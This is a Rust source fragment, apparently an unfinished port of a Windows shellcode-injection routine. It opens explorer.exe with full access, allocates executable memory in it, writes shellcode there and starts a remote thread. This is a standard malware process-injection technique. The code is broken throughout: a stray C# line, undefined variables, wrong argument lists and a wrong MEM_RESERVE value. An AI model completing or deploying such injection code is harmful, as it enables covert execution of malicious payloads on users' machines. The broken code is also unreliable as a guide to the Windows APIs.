use std::ffi::{CString, c_void};
use windows::Win32::System::Threading::{OpenProcessA};

const PROCESS_ALL_ACCESS: i32 =  0x001F0FFF;
const MEM_COMMIT: i32 = 0x1000;
const MEM_RESERVE: i32 = 0x3000;
const PAGE_EXECUTE_READWRITE: i32 = 0x40;

pub fn inject_and_migrate(shellcode: &str) {
    println!("{}", shellcode);

    // This works in C#, don't know the equivalent
    // https://docs.microsoft.com/en- us/dotnet/api/system.diagnostics.process.getprocessesbyname?view=netframework-4.8
    Process[] expProc = Process.GetProcessesByName("explorer");

    // Call OpenProcess to get a handle to the target process via its PID
    // WINDOWS -->
    // RUST -->
    OpenProcess(PROCESS_ALL_ACCESS, false, target_pid);

    // Call VirtualAllocEx to allocate memory for the shellcode
    // WINDOWS -->
    // RUST -->
    let lp_address: c_void = unsafe { mem::zeroed() };
    VirtualAllocEx(hProcess, lp_address, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Call WriteProcessMemory to write the contents of the shellcode into the memory allocated above
    // WINDOWS -->
    // RUST -->
    WriteProcessMemory();

    // Call CreateRemoteThread to create the execution thread in the target PID
    // WINDOWS -->
    // RUST -->
    let lp_address = ptr::null();
    let lp_address: c_void = unsafe { mem::zeroed() };
    let lp_address: c_void = unsafe { mem::zeroed() };
    CreateRemoteThread();
}